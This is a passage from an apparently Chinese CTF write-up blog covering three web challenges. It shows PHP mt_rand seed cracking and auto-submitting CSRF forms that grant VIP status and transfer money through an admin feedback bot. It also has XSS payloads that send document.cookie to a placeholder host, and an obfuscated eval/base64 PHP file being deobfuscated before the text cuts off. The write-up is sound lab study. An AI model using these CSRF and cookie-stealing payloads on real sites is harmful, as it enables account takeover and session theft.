alt="image-20221120130315264"></p><h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004037.png" alt="image-20221120130609597"></p><p>无任何过滤，直接上小马</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004038.png" alt="image-20221120130737316"></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004039.png" alt="image-20221120130901812"></p><h2 id="drinktea"><a href="#drinktea" class="headerlink" title="drinktea"></a>drinktea</h2><p>题目提示是想要买双皮奶，双皮奶需要VIP身份，并且</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">钱不够捏，要999999999999元<br></code></pre></td></tr></table></figure><p>随便注册个账号</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004040.png" alt="image-20221120131029910"></p><p>开始是这样的</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004041.png" alt="image-20221123101101810"></p><p>index.php有hint</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004042.png" alt="image-20221123100415595"></p><p>mng.php</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">只有狮吼功继承人才能更改<span class="hljs-variable constant_">VIP</span>权限，用法示例： <span class="hljs-string">?n</span>ame=f4tb3e&amp;vip=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><a href="http://mc.vveelin.com.cn:8102/report.php">http://mc.vveelin.com.cn:8102/report.php</a></p><p>根据hint在源码发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!-- 其实这个反馈界面还在调试阶段捏，我前几天上班摸鱼了…… --&gt;<span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//真的随机吗？</span><br><span class="hljs-variable">$seed</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/seed&quot;</span>);<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><span class="hljs-title function_ invoke__">mt_rand</span>();<span class="hljs-comment">//   == 1567320364</span><br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;random.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>伪随机数爆破一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">└─# ./php_mt_seed 1567320364                              <br>Pattern: EXACT<br>Version: 3.0.7 to 5.2.0<br>Found 0, trying 0xa8000000 - 0xabffffff, speed 10840.7 Mseeds/s <br>seed = 0xaa4cbfec = 2857156588 (PHP 3.0.7 to 5.2.0)<br>seed = 0xaa4cbfed = 2857156589 (PHP 3.0.7 to 5.2.0)<br>Found 2, trying 0xfc000000 - 0xffffffff, speed 10840.7 Mseeds/s <br>Version: 5.2.1+<br>Found 2, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s <br>seed = 0x000a2c2a = 666666 (PHP 7.1.0+)<br>Found 3, trying 0x16000000 - 0x17ffffff, speed 100.0 Mseeds/s <br>seed = 0x16b73644 = 381105732 (PHP 5.2.1 to 7.0.x; HHVM)<br>Found 4, trying 0xbe000000 - 0xbfffffff, speed 96.3 Mseeds/s <br>seed = 0xbf3e7fc3 = 3208544195 (PHP 7.1.0+)<br>Found 5, trying 0xfe000000 - 0xffffffff, speed 95.8 Mseeds/s <br>Found 5<br><br></code></pre></td></tr></table></figure><p>一看就是666666，放在php7环境运行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#666666</span><br><span class="hljs-variable">$seed</span>=<span class="hljs-number">666666</span>;<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br><span class="hljs-title function_ invoke__">mt_rand</span>();<span class="hljs-comment">//   == 1567320364</span><br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-title function_ invoke__">mt_rand</span>();<br><span class="hljs-variable">$code</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$code</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到验证码：</p><figure class="highlight wasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wasm">2bfd7154e1<span class="hljs-type">f32</span>7a42dae866bac9ecd45<br></code></pre></td></tr></table></figure><p>通过反馈页面，可以进行CSRF。</p><p>获取VIP exp：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">evil</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;postsubmit&quot;</span>).<span class="hljs-title function_">click</span>();</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-string">&quot;evil()&quot;</span>,<span class="hljs-number">0.1</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://mc.vveelin.com.cn:8102/mng.php?name=admin&amp;vip=true&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;vip&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;postsubmit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>这个exp生成的方法有很多，bp自带的CSRF生成工具也可以做，但是不能自动触发，我这里加了一个自动触发函数功能，只要打开，就会自动跳转。</p><p>放在VPS上，将网址反馈给管理员：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://xxx.xxx.xxx.xxx/drinkteaVIP.html&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发送请求</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004043.png" alt="image-20221123101127213"></p><p>再打开主页</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004044.png" alt="image-20221123101735914"></p><p>已经成功升级为VIP</p><p>接着查看双皮奶，结果发现</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">钱不够捏，要999999999999元<br></code></pre></td></tr></table></figure><p>接下来获取money</p><p>有一个转账的trans.php，抓包发现post请求，username为转款对象，money为钱数</p><p>转款 exp：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">evil</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;postsubmit&quot;</span>).<span class="hljs-title function_">click</span>();</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-string">&quot;evil()&quot;</span>,<span class="hljs-number">0.1</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://mc.vveelin.com.cn:8102/trans.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;admin&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;money&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;999999999999&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;postsubmit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>一样的步骤，反馈给管理员</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://xxx/drinktea.html&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004045.png" alt="image-20221123102719998"></p><p>下单</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004046.png" alt="image-20221123102803017"></p><p>其实一开始想的是CSRF+XSS获取cookie，因为没看到mng的页面提示</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;http://xxx/?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;http://xxx/?cookie=&#x27;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>只试了一下XSS，没有成功带出数据，后面CSRF+XSS也没成功</p><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004047.png" alt="image-20221121094709179"></p><p>扫目录扫到一个</p><p>index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$O00OO0</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<span class="hljs-variable">$O00O0O</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;;<span class="hljs-variable">$O0OO00</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$OO0O00</span>=<span class="hljs-variable">$O0OO00</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$O0OO00</span>&#123;<span class="hljs-number">0</span>&#125;    <br>        .<span class="hljs-variable">$O0OO00</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;;<span class="hljs-variable">$OO0000</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">13</span>&#125;;<span class="hljs-variable">$O00O0O</span>.=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">36</span>&#125;    <br>        .<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;;    <br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$O00O0O</span>(<span class="hljs-string">&quot;JE8wTzAwMD0ianlIcUlZZHJNdVZ4a05RVWdlV2xidGFaUFJFRm9LSkNuQmh3RFhwQU9tZkdTaXZzY1RMenp3Y1h5a0VDbXNxTGdoUk5NWkpRYUd2ZldvRlVuU3RBeGpkVmlySXBiVHVPUEJEWWxlS0hXaTlWdmNwU2syTGRsM21NUlRRWWFjUXlmcnR3dko1eEVPOXNBeFlTeUFwTXlBcE15QWpWRUp0WXZKbU10T0Y3QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNFZHYycTFsQU1JQUJwTXlBcE15QXBNWlZuTXlBcE15QXBNeUFwTXlBcE15QXBNdGNvbnZybU1LZTRNa1BwOXlBdFRaY2RDeWNRREVQcEJiVm5NeUFwTXlBcE15YzBTQUJwTXlBcE15QXBNbGNxQmFPUXp5T2YxYVRoMHZKOXN5VTl1Zk9xSEVjdDFrM1JuU1JuTXlBcE15QXBNeWNZU3lBcE15QXBNeUFwTXlBcE15QXBNeU9xenZPOE10Y29udnJtTUtlNE1rUDRCcTI5M3l6WVN5QXBNeUFwTXlBajlBeDBTQVRoWWtyaEh5RnRkYTJFWWtKbzVaVm5NeUFwTXlBcE15Y2oxa1RMSWt3cGdrellTeUFwTXlBcE15QWpWRUp0WXZKbU10T203QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNvRE4zb3d2SjV4U0FnU3lBcE15QXBNeUFqN0FCcE15QXBNeUFwTXlBcE15QXBNeUFwZ0VPZElsd3BHV0JqQnlBMCt5T2RkbGNqNVNBbzB2T1FIeUEwK3lPbUliVm5NeUFwTXlBcE15YzBTdVJuU2syTGRsM21NcVRVc29PVXd2MmREYU8xUVpWbk15QXBNeUFwTXljajFrVExJa3dwZ2ZpWVNBQnBNeUFwTXlBcE1sY3FCYU9RenlPZjFhVGgwdko5c3lPZGRsY2o1U0FvemFKUklaVm5NeUFwTXlBcE15QXBNeUFwTXlBcE1mcmZkYUFNZ2syMWdTZVlTeUFwTXlBcE15QWo5QXgwU0FUUVRTT1FIbDJxMFNBb3VORjllcVVZeGwzb3d0MTBJU3JZU3lBcE15QXBNeUFqMWF4aFFsVFFkYU9RNmZQTWdyMWpXTjFvYXQzaDBsQkVFU2VZU3VSbj0iOyAgCiAgICAgICAgZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwgICAgCiAgICAgICAgJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7&quot;</span>));<span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>echo一下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$O00OO0</span>=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br><span class="hljs-variable">$base64</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">6</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;;<br><span class="hljs-variable">$ggstrtr</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">33</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">10</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$ggsubstr</span>=<span class="hljs-variable">$ggstrtr</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">18</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">3</span>&#125;.<span class="hljs-variable">$ggstrtr</span>&#123;<span class="hljs-number">0</span>&#125;.<span class="hljs-variable">$ggstrtr</span>&#123;<span class="hljs-number">1</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">24</span>&#125;;<br><span class="hljs-variable">$gg52</span>=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">7</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">13</span>&#125;;<br><span class="hljs-variable">$base64</span>.=<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">22</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">36</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">29</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">32</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">35</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">26</span>&#125;.<span class="hljs-variable">$O00OO0</span>&#123;<span class="hljs-number">30</span>&#125;;<br>        <span class="hljs-variable">$O0O000</span>=<span class="hljs-string">&quot;jyHqIYdrMuVxkNQUgeWlbtaZPREFoKJCnBhwDXpAOmfGSivscTLzzwcXykECmsqLghRNMZJQaGvfWoFUnStAxjdVirIpbTuOPBDYleKHWi9VvcpSk2Ldl3mMRTQYacQyfrtwvJ5xEO9sAxYSyApMyApMyAjVEJtYvJmMtOF7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3Edv2q1lAMIABpMyApMyApMZVnMyApMyApMyApMyApMyApMtconvrmMKe4MkPp9yAtTZcdCycQDEPpBbVnMyApMyApMyc0SABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syU9ufOqHEct1k3RnSRnMyApMyApMycYSyApMyApMyApMyApMyApMyOqzvO8MtconvrmMKe4MkP4Bq293yzYSyApMyApMyAj9Ax0SAThYkrhHyFtda2EYkJo5ZVnMyApMyApMycj1kTLIkwpgkzYSyApMyApMyAjVEJtYvJmMtOm7AMnMyApMyApMycj1kTLIkwjTEJ5zEOQDaBjur3oDN3owvJ5xSAgSyApMyApMyAj7ABpMyApMyApMyApMyApMyApgEOdIlwpGWBjByA0+yOddlcj5SAo0vOQHyA0+yOmIbVnMyApMyApMyc0SuRnSk2Ldl3mMqTUsoOUwv2dDaO1QZVnMyApMyApMycj1kTLIkwpgfiYSABpMyApMyApMlcqBaOQzyOf1aTh0vJ9syOddlcj5SAozaJRIZVnMyApMyApMyApMyApMyApMfrfdaAMgk21gSeYSyApMyApMyAj9Ax0SATQTSOQHl2q0SAouNF9eqUYxl3owt10ISrYSyApMyApMyAj1axhQlTQdaOQ6fPMgr1jWN1oat3h0lBEESeYSuRn=&quot;</span>;  <br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;?&gt;&#x27;</span>.<span class="hljs-variable">$base64</span>(<span class="hljs-variable">$ggstrtr</span>(<span class="hljs-variable">$ggsubstr</span>(<span class="hljs-variable">$O0O000</span>,<span class="hljs-variable">$gg52</span>*<span class="hljs-number">2</span>),<span class="hljs-variable">$ggsubstr</span>(<span class="hljs-variable">$O0O000</span>,<span class="hljs-variable">$gg52</span>,<span class="hljs-variable">$gg52</span>),    <br>        <span class="hljs-variable">$ggsubstr</span>(<span class="hljs-variable">$O0O000</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$gg52</span>))));<br>        <span class="hljs-comment">// eval($base64(&quot;JE8wTzAwMD0ianlIcUlZZHJNdVZ4a05RVWdlV2xidGFaUFJFRm9LSkNuQmh3RFhwQU9tZkdTaXZzY1RMenp3Y1h5a0VDbXNxTGdoUk5NWkpRYUd2ZldvRlVuU3RBeGpkVmlySXBiVHVPUEJEWWxlS0hXaTlWdmNwU2syTGRsM21NUlRRWWFjUXlmcnR3dko1eEVPOXNBeFlTeUFwTXlBcE15QWpWRUp0WXZKbU10T0Y3QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNFZHYycTFsQU1JQUJwTXlBcE15QXBNWlZuTXlBcE15QXBNeUFwTXlBcE15QXBNdGNvbnZybU1LZTRNa1BwOXlBdFRaY2RDeWNRREVQcEJiVm5NeUFwTXlBcE15YzBTQUJwTXlBcE15QXBNbGNxQmFPUXp5T2YxYVRoMHZKOXN5VTl1Zk9xSEVjdDFrM1JuU1JuTXlBcE15QXBNeWNZU3lBcE15QXBNeUFwTXlBcE15QXBNeU9xenZPOE10Y29udnJtTUtlNE1rUDRCcTI5M3l6WVN5QXBNeUFwTXlBajlBeDBTQVRoWWtyaEh5RnRkYTJFWWtKbzVaVm5NeUFwTXlBcE15Y2oxa1RMSWt3cGdrellTeUFwTXlBcE15QWpWRUp0WXZKbU10T203QU1uTXlBcE15QXBNeWNqMWtUTElrd2pURUo1ekVPUURhQmp1cjNvRE4zb3d2SjV4U0FnU3lBcE15QXBNeUFqN0FCcE15QXBNeUFwTXlBcE15QXBNeUFwZ0VPZElsd3BHV0JqQnlBMCt5T2RkbGNqNVNBbzB2T1FIeUEwK3lPbUliVm5NeUFwTXlBcE15YzBTdVJuU2syTGRsM21NcVRVc29PVXd2MmREYU8xUVpWbk15QXBNeUFwTXljajFrVExJa3dwZ2ZpWVNBQnBNeUFwTXlBcE1sY3FCYU9RenlPZjFhVGgwdko5c3lPZGRsY2o1U0FvemFKUklaVm5